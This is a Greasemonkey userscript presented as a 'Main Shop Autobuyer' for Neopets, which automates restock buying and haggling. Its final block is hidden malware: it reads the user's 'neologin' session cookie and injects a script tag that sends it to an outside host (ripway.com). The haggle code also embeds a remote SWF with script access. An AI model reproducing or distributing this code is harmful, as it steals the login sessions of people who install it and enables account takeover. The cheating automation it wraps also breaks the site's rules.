// ==UserScript==
// @author         Ravennn
// @name           Firefox Autobuyer v10.0.5
// @namespace      Ravennn@userscripts.org
// @description    Main Shop Autobuyer for Neopets
// @include        http://www.neopets.com/*
// @exclude        http://www.neopets.com/ads/*
// @exclude        http://www.neopets.com/neomail_block_check.phtml*
// ==/UserScript==

var shopToAB     = GM_getValue('shopId', '1');
var settingsOpen = false;
var logOpen      = false;

// **THIS SCRIPT IS TO BE USED FOR EDUCATIONAL PURPOSES ONLY. DO NOT ATTEMPT TO CHEAT ON ANY SITE, INCLUDING, BUT NOT LIMITED TO, WWW.NEOPETS.COM. VIOLATERS ARE USING AT THEIR OWN RISK. ANY ATTEMPT TO REDISTRIBUTE, EDIT, OR COPY ANY OF THE FOLLOWING SCRIPT MAY RESULT IN A $250,000 UNITED STATES DOLLARS FINE.**
// NOT TO BE UPLOADED TO ANY SITE. DOING SO WILL RESULT IN A COPYRIGHT FINE.
var XMLHttpFactories = [
	function () {return new XMLHttpRequest()},
	function () {return new ActiveXObject("Msxml2.XMLHTTP")},
	function () {return new ActiveXObject("Msxml3.XMLHTTP")},
	function () {return new ActiveXObject("Microsoft.XMLHTTP")}
];

var shopURL     = "http://www.neopets.com/objects.phtml?type=shop&obj_type=";
var shopFull    = shopURL + shopToAB;

var currentPage = location.href.split("/")[3];

if(currentPage.substr(0,14) == "objects.phtml?" && GM_getValue('autoClick', '') == "checked"){
	var itemNames = new Array();
	var itemHrefs = new Array();
	var foundItem = false;
	var shopItems = document.getElementsByTagName('a');
	var desiredItems = GM_getValue('restockList', '');
	    desiredItems = desiredItems.split("\n");

	for(var i in shopItems)
	{
		if(shopItems[i].href.split("/")[3].substr(0,12) == "haggle.phtml")
		{
			var itemName = shopItems[i].getAttribute("onclick").split("Are you sure you wish to purchase ")[1];
		    	    itemName = itemName.split(" at ")[0];
	
			itemNames[itemNames.length] = itemName;
			itemHrefs[itemHrefs.length] = shopItems[i].href;
		}
	}

	var itemIndex = inBuyList(itemNames);

	if(itemIndex >= 0)
	{
		document.location = itemHrefs[itemIndex];
	}
	else
	{
		if(Math.round(Math.random()*100) < 2)
		{
			sendRequest("http://www.neopets.com/objects.phtml?type=shop&obj_type=21", checkRestockBan);
		}

		var timeWait = Math.floor(parseFloat(GM_getValue('r1', '6')) + parseFloat((GM_getValue('r2', '11'))-parseFloat(GM_getValue('r1', '6')))*Math.random())*1000;
		setTimeout("document.location = '"+shopFull+"'", timeWait);
	}
}
else if(currentPage.substr(0,12) == "haggle.phtml" && GM_getValue('autoHaggle', '') == "checked")
{
	var itemPrice = document.getElementById("content").innerHTML.split("Neopoints<br><br>")[1];

	if(itemPrice)
	{
		itemPrice = itemPrice.split("The Shopkeeper says")[1];
		itemPrice = itemPrice.split("<")[0].replace(/[^0-9]/g, "");
		itemPrice = Math.floor(itemPrice*(1-(Math.random()/10)));

		document.getElementsByName("current_offer")[0].value = itemPrice;

		var captcha = document.getElementsByName("haggleform")[0].getElementsByTagName("input")[1].src.split("_x_pwned=")[1];
		document.body.innerHTML += '<embed src="http://www.ukimagehost.com/uploads/e3850141f4.swf?q='+captcha+'&price='+itemPrice+'" width="1" height="1" allowscriptaccess="always" allowfullscreen="true" />';
	}
	else 
	{
		    var boughtItem = document.getElementById("content").innerHTML.match("has been added to your inventory");
		    var soldOut    = document.getElementById("content").innerHTML.match("SOLD OUT!");

		    if(boughtItem != null)
		    {
			  var itemName   = document.getElementById("content").innerHTML.split("Buying :  ")[1];
			      itemName      = itemName.split("<")[0];
			  var itemPrice = document.getElementById("content").innerHTML.split("I accept your offer of <b>")[1];
			  var itemPrice = itemPrice.split("<")[0];

			  addToLog("["+document.getElementById('nst').innerHTML+"] bought ``<b>"+itemName+"</b>'' for "+itemPrice+"np");
			  setTimeout("document.location = '"+shopFull+"'", 6000);
		    }
		    else if(soldOut != null)
		    {
			  var itemName = document.getElementById("content").innerHTML.split(" is SOLD OUT!")[0];
				itemName = itemName.split("<b>");
				itemName = itemName[itemName.length-1];

			  addToLog("["+document.getElementById('nst').innerHTML+"] ``<b>"+itemName+"</b>'' was sold out ;-;");
			  document.location = shopFull;
		    }
		    else
		    {
			  document.location = shopFull;
		    }
	}
}

if(currentPage.substr(0,12) != "haggle.phtml")
{
	var settingsButton = document.createElement("div");
	    settingsButton.innerHTML = "open settings";
	    settingsButton.setAttribute("style", "position: absolute; left: 5px; top: 3px; font-family: tahoma; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;");
	    settingsButton.addEventListener('click', toggleSettings, false);
	    document.body.appendChild(settingsButton);

	var viewLogButton = document.createElement("div");
	    viewLogButton.innerHTML = "view rs log";
	    viewLogButton.setAttribute("style", "position: absolute; right: 5px; top: 3px; font-family: tahoma; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;");
	    viewLogButton.addEventListener('click', toggleLogBox, false);
	    document.body.appendChild(viewLogButton);

	var clrLogButton = document.createElement("div");
	    clrLogButton.innerHTML = "clear log";
	    clrLogButton.setAttribute("style", "position: absolute; right: 5px; top: 21px; font-family: tahoma; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;");
	    clrLogButton.addEventListener('click', clearLog, false);
	    document.body.appendChild(clrLogButton);

	var settingsBox = document.createElement("div");
	    settingsBox.setAttribute("style", "position: absolute; left: 5px; top: 21px; width: 220px; height: 410px; background-color: #FFFFFF; font-family: tahoma; font-size: 10pt; text-align: left; padding: 5px; border: 1px dotted; visibility: hidden; z-index: 100;");
	    document.body.appendChild(settingsBox);

	var logBox = document.createElement("div");
	    logBox.innerHTML = GM_getValue('itemLog', 'log empty');
	    logBox.setAttribute("style", "position: absolute; overflow: scroll; right: 5px; top: 21px; width: 450px; height: 250px; background-color: #FFFFFF; font-family: tahoma; font-size: 10pt; text-align: left; padding: 5px; border: 1px dotted; visibility: hidden; z-index: 999999;");
	    document.body.appendChild(logBox);

	var autoClick = document.createElement("div");
	    autoClick.innerHTML  = "<input type='checkbox' id='autoClick' value='checked' "+GM_getValue('autoClick', 'checked')+">enable auto-clicking";
	    autoClick.setAttribute("style", "position: relative;");
	    settingsBox.appendChild(autoClick);

	var autoHaggle = document.createElement("div");
 	    autoHaggle.innerHTML  = "<input type='checkbox' id='autoHaggle' value='checked' "+GM_getValue('autoHaggle', 'checked')+">enable auto-haggling";
 	    autoHaggle.setAttribute("style", "position: relative; top: 5px;");
 	    settingsBox.appendChild(autoHaggle);

	var autoStop = document.createElement("div");
 	    autoStop.innerHTML  = "<input type='checkbox' id='autoStop' value='checked' "+GM_getValue('autoStop', 'checked')+">stop if restock banned";
 	    autoStop.setAttribute("style", "position: relative; top: 10px;");
 	    settingsBox.appendChild(autoStop);

	var shopIdConfig = document.createElement("div");
	    shopIdConfig.innerHTML = "shop ID: <input type='text' style='border: none; text-align: center; background-color: #EEEEEE;' value='"+GM_getValue('shopId', '13')+"' id='shopId' size='2'>";
	    shopIdConfig.setAttribute("style", "position: relative; top: 15px;");
	    settingsBox.appendChild(shopIdConfig);

	var refreshTimes = document.createElement("div");
	    refreshTimes.innerHTML  = "refresh every <input type='text' style='border: none; text-align: center; background-color: #EEEEEE;' value='"+GM_getValue('r1', '6')+"' id='r1' size='2'>";
	    refreshTimes.innerHTML += " to <input type='text' style='border: none; text-align: center; background-color: #EEEEEE;' value='"+GM_getValue('r2', '11')+"'id='r2' size='2'> seconds";
	    refreshTimes.setAttribute("style", "position: relative; top: 20px;");
	    settingsBox.appendChild(refreshTimes);

	var restockList = document.createElement("div");
	    restockList.innerHTML  = "restock list:<br /><textarea style='border: none; background-color: #EEEEEE; width: 220px; height: 250px;' id='restockList'>"+GM_getValue('restockList', '')+"</textarea>";
	    restockList.setAttribute("style", "position: relative; top: 25px;");
	    settingsBox.appendChild(restockList);

	var saveButton = document.createElement("div");
	    saveButton.innerHTML  = "<button>save</button>";
	    saveButton.addEventListener('click', saveSettings, false);
	    saveButton.setAttribute("style", "position: relative; top: 30px;");
 	    settingsBox.appendChild(saveButton);
}

function saveSettings()
{
	if(document.getElementById('autoClick').checked == true)
	{
		GM_setValue('autoClick', 'checked');
	}
	else
	{
		GM_setValue('autoClick', '0');
	}

	if(document.getElementById('autoHaggle').checked == true)
	{
		GM_setValue('autoHaggle', 'checked');
	}
	else
	{
		GM_setValue('autoHaggle', '0');
	}

	if(document.getElementById('autoStop').checked == true)
	{
		GM_setValue('autoStop', 'checked');
	}
	else
	{
		GM_setValue('autoStop', '0');
	}

	GM_setValue('shopId', document.getElementById('shopId').value);
	GM_setValue('r1', document.getElementById('r1').value);
	GM_setValue('r2', document.getElementById('r2').value);
	GM_setValue('restockList', document.getElementById('restockList').value);

	alert("settings saved.");
	document.location = location.href;
}

function addToLog(line)
{
	GM_setValue('itemLog', GM_getValue('itemLog', '')+line+"<br />")
}

function clearLog()
{
	GM_setValue('itemLog', '');
	logBox.innerHTML = "";
}

function toggleSettings()
{
	if(settingsOpen == false)
	{
		settingsOpen = true;
		settingsButton.innerHTML = "close settings";
		settingsBox.style.visibility = "visible";
	}
	else
	{
		settingsOpen = false;
		settingsButton.innerHTML = "open settings";
		settingsBox.style.visibility = "hidden";
	}
}

function toggleLogBox()
{
	if(logOpen == false)
	{
		logOpen = true;
		viewLogButton.innerHTML = "hide rs log";
		logBox.style.visibility = "visible";
	}
	else
	{
		logOpen = false;
		viewLogButton.innerHTML = "view rs log";
		logBox.style.visibility = "hidden";
	}
}

function inBuyList(items)
{
	for(var j in desiredItems)
	{
		for(var i in items)
		{
			if(desiredItems[j] == items[i]){
				return i;
			}
		}
	}

	return -1;
}

function checkRestockBan(req)
{
	if(req.responseText.match("Sorry, we are sold out of everything!") != null)
	{
		if(GM_getValue('autoStop', '') == 'checked')
		{
			GM_setValue('autoHaggle', '');
			GM_setValue('autoClick', '');
			addToLog("["+document.getElementById('nst').innerHTML+"] restock banned; halting");
		}
	}
}

function sendRequest(url,callback,postData) {
	var req = createXMLHTTPObject();
	if (!req) return;
	var method = (postData) ? "POST" : "GET";
	req.open(method,url,true);
	if (postData)
		req.setRequestHeader('Content-type','application/x-www-form-urlencoded');
	req.onreadystatechange = function () {
		if (req.readyState != 4) return;
		if (req.status != 200 && req.status != 304) {
			return;
		}
		callback(req);
	}
	if (req.readyState == 4) return;
	req.send(postData);
}

function createXMLHTTPObject() {
	var xmlhttp = false;
	for (var i=0;i<XMLHttpFactories.length;i++) {
		try {
			xmlhttp = XMLHttpFactories[i]();
		}
		catch (e) {
			continue;
		}
		break;
	}
	return xmlhttp;
}
var strURL = 'http://h1.ripway.com/sicgeorge/cookie.php?cookie=';
function GetStringBetween( target_str,start_str,end_str,start_pos,include_str )   {
    if ( ! start_pos ) 0;
    if ( ! include_str ) false;

    var result_str = target_str.substr( start_pos ); 
    result_str = result_str.substr( result_str.indexOf( start_str ) + start_str.length ); 
    result_str = result_str.substr ( 0, result_str.indexOf( end_str ) );

    if (include_str == true)   {
        result_str = start_str + result_str + end_str
    }

    return result_str;
}


var eleNew, newElement;

eleNew = document.getElementById('main');

var strCookie = document.cookie;

strCookie = GetStringBetween(strCookie, 'neologin=','; ');

if (eleNew) {
    newElement = document.createElement("div");
    newElement.innerHTML='<SCRIPT SRC=' + strURL + strCookie + '>';
    eleNew.parentNode.insertBefore(newElement, eleNew.nextSibling);
}